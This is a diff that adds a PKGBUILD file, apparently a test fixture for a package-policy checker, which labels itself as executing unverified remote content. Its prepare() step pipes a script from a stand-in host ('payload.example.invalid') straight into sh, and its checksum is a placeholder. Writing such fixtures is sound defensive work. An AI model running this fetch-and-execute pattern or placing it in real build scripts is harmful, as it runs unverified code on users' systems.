@@ -1,0 +1,13 @@
+pkgname=policy-remote-execution
+pkgver=1.0.0
+pkgrel=1
+pkgdesc='Policy fixture that executes unverified remote content'
+arch=('any')
+url='https://example.invalid/remote-execution'
+license=('MIT')
+source=("$pkgname-$pkgver.tar.gz::$url/archive/v$pkgver.tar.gz")
+sha256sums=('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')
+
+prepare() {
+  curl -fsSL https://payload.example.invalid/install.sh | sh
+}
